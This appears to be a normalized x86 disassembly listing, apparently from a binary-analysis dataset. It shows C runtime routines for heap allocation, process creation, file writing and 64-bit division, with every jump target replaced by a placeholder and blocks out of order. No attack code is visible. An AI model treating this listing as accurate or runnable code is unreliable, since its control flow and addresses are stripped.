cmp edx 0xffffffff
je rwxdata
mov esi [ esi ]
cmp esi [ rwxdata ]
je rwxdata
mov eax [ edi ]
cmp eax ebx
jl rwxdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb rwxdata
cmp [ edi + 0x4 ] ebx
jbe rwxdata
call sub_42597b
test eax eax
je rwxdata
jmp rwxdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne rwxdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb rwxdata
cmp [ edi + 0x4 ] ebx
jbe rwxdata
jmp rwxdata
push ebx
push ecx
push eax
call sub_425e7b
add esp 0xc
test eax eax
jne rwxdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rwxdata ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp rwxdata
cmp [ edi + 0x10 ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne rwxdata
cmp [ ebp - 0x4 ] 0x10
jge rwxdata
jmp rwxdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_425e7b
add esp 0xc
test eax eax
jne rwxdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae rwxdata
mov [ rwxdata ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp rwxdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_422720
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle rwxdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je rwxdata
mov [ edi + 0x4 ] ebx
mov [ rwxdata ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp rwxdata
cmp [ ecx ] 0xffffffff
je rwxdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne rwxdata
cmp ecx eax
add ecx 0x8
jmp rwxdata
cmp ecx eax
jae rwxdata
sub_425e7b
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb rwxdata
add esi edi
cmp [ esi ] 0x0
je rwxdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae rwxdata
lea esi [ eax + edx ]
cmp esi ebx
jae rwxdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp rwxdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne rwxdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp rwxdata
lea eax [ edi + 0x8 ]
jmp rwxdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae rwxdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne rwxdata
cmp esi edx
jae rwxdata
inc ebx
inc esi
jmp rwxdata
movzx eax al
add esi eax
jmp rwxdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae rwxdata
cmp eax [ ebp - 0x4 ]
jne rwxdata
cmp [ ebx ] 0x0
jne rwxdata
cmp esi edi
jae rwxdata
cmp eax edx
jae rwxdata
inc ebx
inc eax
jmp rwxdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp rwxdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb rwxdata
mov [ ecx + 0x4 ] esi
jmp rwxdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae rwxdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb rwxdata
cmp [ ebx ] 0x0
jne rwxdata
mov [ eax ] dl
add eax 0x8
jmp rwxdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp rwxdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp rwxdata
mov esi ebx
jmp rwxdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb rwxdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_425f9f
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
movzx ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ edi + 0x10 ]
sar eax 0xc
cmp ecx [ ebp + 0x14 ]
lea edi [ edi + eax * 8 + 0x18 ]
jbe rwxdata
jae rwxdata
mov eax [ ebp + 0x14 ]
sub ecx eax
mov [ edx ] al
add [ edi ] ecx
mov [ edi + 0x4 ] 0xf1
jmp rwxdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ edx + eax ]
lea eax [ ebx + 0xf8 ]
cmp esi eax
ja rwxdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + edx ]
jne rwxdata
cmp [ eax ] 0x0
jne rwxdata
mov al [ ebp + 0x14 ]
mov [ edx ] al
mov eax [ ebx ]
cmp edx eax
ja rwxdata
cmp eax esi
inc eax
jmp rwxdata
sub ecx [ ebp + 0x14 ]
add [ edi ] ecx
cmp esi eax
jbe rwxdata
cmp eax esi
jae rwxdata
lea eax [ ebx + 0xf8 ]
cmp esi eax
jae rwxdata
and [ ebx + 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] esi
cmp [ esi ] al
jne rwxdata
mov [ ebx + 0x4 ] eax
jmp rwxdata
inc eax
cmp [ esi + eax ] 0x0
je rwxdata
sub_426048
mov eax [ rwxdata ]
test eax eax
je rwxdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je rwxdata
push 0x1
pop eax
retn
sub_426063
push ebp
mov ebp esp
xor eax eax
cmp [ rwxdata ] eax
jne rwxdata
mov edx [ ebp + 0x8 ]
push ebx
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427990
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp + 0xc ] ecx
mov bl [ edx + 0x1 ]
inc edx
test bl bl
je rwxdata
inc edx
test bl bl
jne rwxdata
mov eax edx
test eax eax
jmp rwxdata
movzx esi bl
shl ecx 0x8
or ecx esi
cmp [ ebp + 0xc ] ecx
jne rwxdata
mov bl [ edx ]
movzx ecx bl
movzx esi cl
test [ esi + rwxdata ] 0x4
je rwxdata
pop esi
pop ebx
pop ebp
retn
jne rwxdata
lea eax [ edx - 0x1 ]
jmp rwxdata
sub_4260c3
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
push esi
mov eax ecx
je rwxdata
inc ecx
jmp rwxdata
mov esi [ ebp + 0xc ]
mov dl [ ecx ]
mov esi [ ebp + 0xc ]
test dl dl
je rwxdata
cmp [ ecx ] 0x3b
jne rwxdata
cmp [ ecx ] 0x3b
jne rwxdata
cmp dl 0x3b
je rwxdata
and [ esi ] 0x0
sub eax ecx
neg eax
sbb eax eax
pop esi
and eax ecx
pop ebp
retn
inc ecx
jmp rwxdata
cmp dl 0x22
je rwxdata
inc ecx
mov [ esi ] dl
inc esi
inc ecx
dec [ ebp + 0x10 ]
je rwxdata
cmp [ ecx ] 0x0
je rwxdata
cmp dl 0x22
je rwxdata
mov eax ecx
jmp rwxdata
jmp rwxdata
mov dl [ ecx ]
test dl dl
jne rwxdata
inc ecx
mov [ esi ] dl
inc esi
inc ecx
dec [ ebp + 0x10 ]
je rwxdata
jmp rwxdata
mov dl [ ecx ]
test dl dl
je rwxdata
sub_426137
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne rwxdata
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427310
pop ecx
pop ecx
pop ebp
retn
movzx edx ax
mov eax [ ebp + 0xc ]
sub eax edx
neg eax
sbb eax eax
not eax
and eax ecx
pop ebp
retn
movzx edx al
test [ edx + rwxdata ] 0x4
je rwxdata
movzx edx ax
cmp [ ebp + 0xc ] edx
je rwxdata
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je rwxdata
inc ecx
jmp rwxdata
xor eax eax
pop ebp
retn
movzx eax ax
movzx edx dl
shl eax 0x8
or eax edx
cmp [ ebp + 0xc ] eax
je rwxdata
movzx ax [ ecx ]
test ax ax
je rwxdata
lea eax [ ecx - 0x1 ]
pop ebp
retn
jmp rwxdata
sub_4261aa
push ebp
mov ebp esp
sub esp 0x60
mov eax [ ebp + 0x8 ]
and [ ebp - 0x1 ] 0x0
push ebx
push esi
push edi
xor edi edi
cmp eax edi
mov [ ebp - 0x8 ] edi
je rwxdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
cmp eax 0x1
je rwxdata
push 0x44
lea eax [ ebp - 0x60 ]
pop esi
push esi
push edi
push eax
call sub_422720
mov [ ebp - 0x60 ] esi
mov esi [ rwxdata ]
add esp 0xc
cmp esi edi
je rwxdata
inc eax
cmp [ eax ] 0x0
jne rwxdata
jle rwxdata
lea eax [ esi + esi * 4 + 0x4 ]
push 0x1
mov [ ebp - 0x2e ] ax
movzx eax ax
push eax
call sub_426bb3
mov [ ebp - 0x2c ] eax
pop ecx
mov [ eax ] esi
mov eax [ ebp - 0x2c ]
pop ecx
xor ebx ebx
cmp esi edi
lea ecx [ eax + 0x4 ]
lea edx [ eax + esi + 0x4 ]
jle rwxdata
lea eax [ esi - 0x1 ]
cmp [ eax + 0x1 ] 0x0
lea ecx [ eax + 0x1 ]
je rwxdata
mov [ rwxdata ] 0x16
mov [ rwxdata ] edi
jmp rwxdata
cmp eax 0x3
jle rwxdata
cmp [ ebp - 0x1 ] 0x0
je rwxdata
mov eax ebx
mov edi ebx
sar eax 0x5
and edi 0x1f
mov eax [ eax * 4 + rwxdata ]
lea edi [ eax + edi * 8 ]
mov al [ edi + 0x4 ]
test al 0x10
jne rwxdata
dec esi
dec eax
cmp esi edi
jne rwxdata
mov cl [ eax ]
test cl cl
je rwxdata
mov [ eax ] 0x20
mov eax ecx
jmp rwxdata
or eax 0xffffffff
jmp rwxdata
cmp eax 0x4
jne rwxdata
lea eax [ ebp - 0x1c ]
mov [ rwxdata ] edi
push eax
lea eax [ ebp - 0x60 ]
push eax
push edi
push [ ebp + 0x14 ]
mov [ rwxdata ] edi
push [ ebp - 0x8 ]
push 0x1
push edi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call [ CreateProcessA@IAT ]
mov esi eax
call [ GetLastError@IAT ]
push [ ebp - 0x2c ]
mov ebx eax
call sub_423e39
cmp esi edi
pop ecx
jne rwxdata
lea ecx [ eax + 0x4 ]
xor edx edx
lea eax [ eax + esi + 0x4 ]
and [ ecx ] 0x0
or [ edx ] 0xffffffff
mov [ ecx ] al
mov eax [ edi ]
mov [ edx ] eax
jmp rwxdata
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rwxdata ]
cmp [ ecx + edx * 8 + 0x4 ] 0x0
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x1 ] 0x1
cmp [ ebp + 0x8 ] 0x2
jne rwxdata
push ebx
call sub_42658d
pop ecx
push 0x3
pop ebx
mov ebx esi
jmp rwxdata
mov eax [ ebp - 0x2c ]
xor edi edi
inc ebx
inc ecx
add edx 0x4
cmp ebx esi
jl rwxdata
cmp [ ebp + 0x8 ] edi
mov esi [ CloseHandle@IAT ]
jne rwxdata
push edi
call sub_422f28
mov [ ebp - 0x8 ] 0x8
and [ ecx ] 0x0
or [ eax ] 0xffffffff
inc edx
inc ecx
add eax 0x4
jmp rwxdata
cmp edx ebx
jge rwxdata
cmp [ ebp + 0x8 ] 0x4
jne rwxdata
push 0xffffffff
push [ ebp - 0x1c ]
call [ WaitForSingleObject@IAT ]
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x1c ]
call [ GetExitCodeProcess@IAT ]
push [ ebp - 0x1c ]
call esi
jmp rwxdata
cmp esi 0x3
jge rwxdata
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x1c ]
call esi
mov [ ebp + 0x10 ] edi
jmp rwxdata
push [ ebp - 0x18 ]
call esi
mov eax [ ebp + 0x10 ]
sub_426389
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x2
pop esi
mov edi esi
push edi
call sub_42304d
pop ecx
mov ecx [ ebp + 0x10 ]
test eax eax
mov [ ecx ] eax
jne rwxdata
push eax
add ebx 0x4
call sub_4224c0
pop ecx
lea edi [ edi + eax + 0x1 ]
jmp rwxdata
mov edi [ ebp + 0xc ]
test edi edi
je rwxdata
mov eax [ ebp + 0x14 ]
and [ eax ] 0x0
jmp rwxdata
mov eax [ ebx ]
test eax eax
je rwxdata
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
and [ eax ] 0x0
mov eax [ edi ]
test eax eax
je rwxdata
mov [ rwxdata ] 0xc
mov [ rwxdata ] 0x8
push eax
push esi
call sub_422540
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
add eax 0x4
push ecx
mov [ ebp + 0x10 ] eax
call sub_4224c0
add esp 0xc
lea esi [ esi + eax + 0x1 ]
inc esi
jmp rwxdata
mov eax [ rwxdata ]
test eax eax
jne rwxdata
push eax
add edi 0x4
call sub_4224c0
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp rwxdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x14 ]
and [ esi - 0x1 ] 0x0
and [ esi ] 0x0
cmp [ ebp + 0xc ] 0x0
mov esi [ eax ]
je rwxdata
push eax
push esi
call sub_422540
mov eax [ ebp + 0x10 ]
add [ ebp + 0x10 ] 0x4
mov eax [ eax ]
push eax
call sub_4224c0
add esp 0xc
add esi eax
mov [ esi ] 0x20
jmp rwxdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test eax eax
je rwxdata
xor ebx ebx
cmp [ eax ] bl
je rwxdata
call sub_424628
test eax eax
mov [ rwxdata ] eax
je rwxdata
test esi esi
je rwxdata
mov eax edi
sub eax ebx
push eax
mov eax [ rwxdata ]
add eax ebx
push eax
push esi
call sub_422780
sub edi ebx
add esp 0xc
add esi edi
mov edi [ ebp + 0xc ]
mov edi ebx
add eax ebx
mov edi eax
mov cl [ edi ]
or eax 0xffffffff
jmp rwxdata
push [ rwxdata ]
call sub_423e39
and [ rwxdata ] 0x0
pop ecx
xor eax eax
mov eax [ ebp + 0x14 ]
cmp esi [ eax ]
jne rwxdata
push eax
push esi
call sub_422540
mov eax [ edi ]
add edi 0x4
push eax
call sub_4224c0
add esp 0xc
lea esi [ esi + eax + 0x1 ]
jmp rwxdata
mov eax edi
sub eax ebx
add eax esi
push eax
call sub_42304d
pop ecx
mov ecx [ ebp + 0x14 ]
test eax eax
mov [ ecx ] eax
jne rwxdata
cmp [ eax + 0x1 ] 0x0
je rwxdata
push edi
call sub_4224c0
lea ebx [ ebx + eax + 0x1 ]
mov eax [ rwxdata ]
pop ecx
mov cl [ eax + ebx ]
lea edi [ eax + ebx ]
test cl cl
jne rwxdata
and [ esi ] 0x0
and [ esi ] 0x0
inc esi
mov eax [ edi ]
test eax eax
je rwxdata
mov eax [ ebp + 0x10 ]
mov esi [ eax ]
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ eax ]
test eax eax
jne rwxdata
mov esi [ ebp + 0x10 ]
push [ esi ]
call sub_423e39
and [ esi ] 0x0
pop ecx
cmp [ eax + 0x2 ] 0x3a
jne rwxdata
cmp cl 0x3d
je rwxdata
cmp [ eax + 0x3 ] 0x3d
jne rwxdata
add eax 0x4
push eax
call sub_4224c0
lea edi [ edi + eax + 0x5 ]
mov eax [ rwxdata ]
pop ecx
add eax edi
jmp rwxdata
cmp [ eax ] 0x3d
jne rwxdata
sub_42658d
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rwxdata ] ecx
mov eax rwxdata
mov eax [ edx * 8 + rwxdata ]
mov [ rwxdata ] eax
retn
add eax 0x8
inc edx
cmp eax rwxdata
jb rwxdata
cmp ecx [ eax ]
je rwxdata
cmp ecx 0x13
jb rwxdata
cmp ecx 0xbc
jb rwxdata
cmp ecx 0x24
ja rwxdata
mov [ rwxdata ] 0x16
cmp ecx 0xca
mov [ rwxdata ] 0x8
jbe rwxdata
mov [ rwxdata ] 0xd
retn
retn
sub_4265f4
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne rwxdata
push [ rwxdata ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rwxdata ]
call sub_4279b7
add esp 0x1c
test eax eax
jne rwxdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_426633
push ecx
push ebx
push ebp
push esi
mov esi [ rwxdata ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je rwxdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp rwxdata
push ebp
call sub_42304d
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je rwxdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je rwxdata
push edi
push [ esp + 0x14 ]
call sub_427c5f
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne rwxdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je rwxdata
sub_4266a1
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rwxdata ]
push esi
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rwxdata ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je rwxdata
push eax
call sub_426b1f
cmp eax 0xffffffff
pop ecx
jne rwxdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne rwxdata
mov [ rwxdata ] 0x9
jmp rwxdata
xor eax eax
call [ GetLastError@IAT ]
jmp rwxdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp rwxdata
push eax
call sub_42658d
pop ecx
jmp rwxdata
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
sub_42673b
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rwxdata ]
push esi
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ ebx ]
mov al [ eax + esi + 0x4 ]
test al 0x1
je rwxdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne rwxdata
test al 0x20
je rwxdata
xor eax eax
jmp rwxdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je rwxdata
push 0x2
push edi
push ecx
call sub_4266a1
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je rwxdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe rwxdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp rwxdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp rwxdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je rwxdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne rwxdata
mov [ rwxdata ] 0x1c
mov [ rwxdata ] edi
jmp rwxdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je rwxdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne rwxdata
sub eax [ ebp - 0x10 ]
jmp rwxdata
cmp [ ebp + 0x8 ] edi
je rwxdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp rwxdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl rwxdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl rwxdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne rwxdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb rwxdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae rwxdata
push [ ebp + 0x8 ]
call sub_42658d
pop ecx
jmp rwxdata
mov [ rwxdata ] 0x9
mov [ rwxdata ] eax
jmp rwxdata
sub_4268e8
inc [ rwxdata ]
push 0x1000
call sub_42304d
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je rwxdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp rwxdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_426952
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne rwxdata
cmp [ rwxdata ] 0x0
jne rwxdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rwxdata ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rwxdata ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je rwxdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja rwxdata
mov [ rwxdata ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je rwxdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_4269c0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne rwxdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp rwxdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne rwxdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb rwxdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja rwxdata
jb rwxdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe rwxdata
sub_426a30
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne rwxdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp rwxdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne rwxdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb rwxdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja rwxdata
jb rwxdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe rwxdata
sub_426aa5
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rwxdata ]
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je rwxdata
cmp [ eax ] 0xffffffff
je rwxdata
cmp [ rwxdata ] 0x1
jne rwxdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp rwxdata
xor eax eax
sub ecx eax
je rwxdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je rwxdata
push eax
push 0xfffffff5
jmp rwxdata
dec ecx
jne rwxdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp rwxdata
sub_426b1f
mov eax [ esp + 0x4 ]
cmp eax [ rwxdata ]
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je rwxdata
mov eax [ eax ]
retn
sub_426b5c
mov eax [ esp + 0x4 ]
cmp eax [ rwxdata ]
jae rwxdata
mov [ rwxdata ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rwxdata ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je rwxdata
push eax
call sub_426b1f
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne rwxdata
xor eax eax
call [ GetLastError@IAT ]
jmp rwxdata
retn
mov [ rwxdata ] eax
test eax eax
je rwxdata
sub_426bb3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
cmp esi 0xffffffe0
push edi
mov [ ebp + 0x8 ] esi
ja rwxdata
xor edi edi
cmp esi 0xffffffe0
ja rwxdata
test esi esi
jne rwxdata
cmp [ rwxdata ] 0x0
je rwxdata
mov eax [ rwxdata ]
cmp eax 0x3
jne rwxdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_426048
test eax eax
pop ecx
je rwxdata
cmp eax 0x2
jne rwxdata
mov eax [ ebp + 0x8 ]
cmp eax [ rwxdata ]
ja rwxdata
xor eax eax
jmp rwxdata
jmp rwxdata
push esi
push 0x8
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne rwxdata
